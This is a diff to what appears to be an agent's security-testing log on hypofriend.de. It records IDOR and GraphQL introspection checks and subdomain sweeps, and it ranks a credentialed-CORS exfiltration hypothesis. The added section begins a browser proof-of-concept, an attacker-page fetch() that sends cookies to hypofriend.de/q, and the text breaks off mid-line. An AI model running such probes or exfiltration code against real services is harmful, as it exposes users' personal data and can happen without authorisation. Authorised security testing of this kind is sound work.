@@ -1109,3 +1109,7 @@
 - LEARN: REJECTED MISCONFIG @ core.hypofriend.de/q: `root.lead` does NOT accept ID argument (returns current session lead only) — not an IDOR vector
 - LEARN: CONFIRMED MISCONFIG @ core.hypofriend.de/q: introspection disabled (`__schema` not exist) — unlike property-search-api, no server-side schema dump vector
 - LEARN: CONFIRMED NG @ fleet sweep: all dead subdomains + buckets unchanged (503/000/301/403) — no new surface
+
+## RANKED HYPOTHESES 2026-09-09 00:27:33 UTC
+- [74] hypofriend.de/q: Credentialed CORS + cookie-session lead → silent cross-origin lead-data exfil (from art/lead_bigpickle.txt)
+- NEXT(hypotheses-bigpickle.txt): HUMAN: browser PoC — attacker page `fetch('https://hypofriend.de/q',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.s
